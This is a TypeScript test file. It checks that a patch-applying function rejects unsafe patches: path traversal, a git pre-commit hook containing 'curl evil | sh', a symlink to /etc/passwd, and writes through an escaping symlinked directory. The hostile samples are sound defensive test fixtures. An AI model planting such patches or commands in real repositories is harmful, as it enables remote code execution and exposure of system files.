import { afterEach, expect, test } from "bun:test"
import { execSync } from "node:child_process"
import { existsSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs"
import os from "node:os"
import path from "node:path"
import { applyPatch, UnsafePatch } from "../src/apply.ts"

const dirs: string[] = []
afterEach(() => dirs.splice(0).forEach((dir) => rmSync(dir, { recursive: true, force: true })))
const tmp = () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "rs-unsafe-"))
  dirs.push(dir)
  return dir
}
const project = () => {
  const dir = tmp()
  execSync("git init -q && git config user.email t@t && git config user.name t", { cwd: dir })
  writeFileSync(path.join(dir, "a.txt"), "a\n")
  execSync("git add -A && git commit -qm init", { cwd: dir })
  return dir
}
const patchFile = (text: string) => {
  const file = path.join(tmp(), "task.patch")
  writeFileSync(file, text)
  return file
}
const newFile = (target: string, content = "pwned") =>
  `diff --git a/${target} b/${target}\nnew file mode 100644\nindex 0000000..1111111\n--- /dev/null\n+++ b/${target}\n@@ -0,0 +1 @@\n+${content}\n`

test("rejects paths that climb out of the project", async () => {
  const dir = project()
  await expect(applyPatch(dir, patchFile(newFile("../outside.txt")))).rejects.toBeInstanceOf(UnsafePatch)
  await expect(applyPatch(dir, patchFile(newFile("src/../../outside.txt")))).rejects.toThrow(/outside the project/)
  expect(existsSync(path.join(path.dirname(dir), "outside.txt"))).toBe(false)
})

test("rejects git internals such as hooks", async () => {
  const dir = project()
  await expect(applyPatch(dir, patchFile(newFile(".git/hooks/pre-commit", "curl evil | sh")))).rejects.toThrow(/git internals/)
  await expect(applyPatch(dir, patchFile(newFile("sub/.GIT/config")))).rejects.toThrow(/git internals/)
})

test("rejects symbolic links", async () => {
  const dir = project()
  const link = `diff --git a/link b/link\nnew file mode 120000\nindex 0000000..2222222\n--- /dev/null\n+++ b/link\n@@ -0,0 +1 @@\n+/etc/passwd\n\\ No newline at end of file\n`
  await expect(applyPatch(dir, patchFile(link))).rejects.toThrow(/symbolic link/)
})

test("rejects writes through an existing symlinked directory that leaves the project", async () => {
  const dir = project()
  const outside = tmp()
  symlinkSync(outside, path.join(dir, "escape"))
  await expect(applyPatch(dir, patchFile(newFile("escape/planted.txt")))).rejects.toThrow(/leaves the project/)
  expect(existsSync(path.join(outside, "planted.txt"))).toBe(false)
})

test("still applies ordinary patches, including new nested folders", async () => {
  const dir = project()
  mkdirSync(path.join(dir, "src"))
  const result = await applyPatch(dir, patchFile(newFile("src/new/deep.txt", "ok")))
  expect(result.status).toBe("applied")
  expect(existsSync(path.join(dir, "src/new/deep.txt"))).toBe(true)
})
